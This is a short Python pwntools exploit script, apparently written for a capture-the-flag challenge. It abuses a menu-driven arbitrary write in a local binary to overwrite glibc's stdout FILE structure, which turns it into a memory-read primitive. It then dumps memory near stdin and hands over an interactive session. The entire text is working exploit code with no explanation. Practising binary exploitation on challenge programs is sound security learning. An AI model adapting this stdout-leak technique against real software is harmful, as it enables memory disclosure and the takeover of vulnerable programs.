from pwn import *
context.log_level="debug"

p = process("./prog")

def write(addr, data):
  p.sendlineafter('choice> ', '1')
  p.sendlineafter('> ', str(addr))
  p.sendlineafter('size> ', str(len(data))+'\x00')
  p.sendafter('data> ', data)

# stdout read primitive
def readmem(stdout_addr, addr, size, returned=0):
  temp = p64(0xfbad1887) + p64(stdout_addr+0x83)*3 + p64(addr) + p64(addr+size)*3 + p64(addr+size+1)
  write(stdout_addr, temp)
  if returned:
    return p.recv(size)


# use given leak for experiments, will need no leak on real challenge
p.recvuntil('leak: ', drop=True)
stdout = int(p.recvuntil('\n',drop=True),16)
# read a bit before stdin
print(hexdump(readmem(stdout, stdout-0xcf0, 216, 1)))

p.interactive()

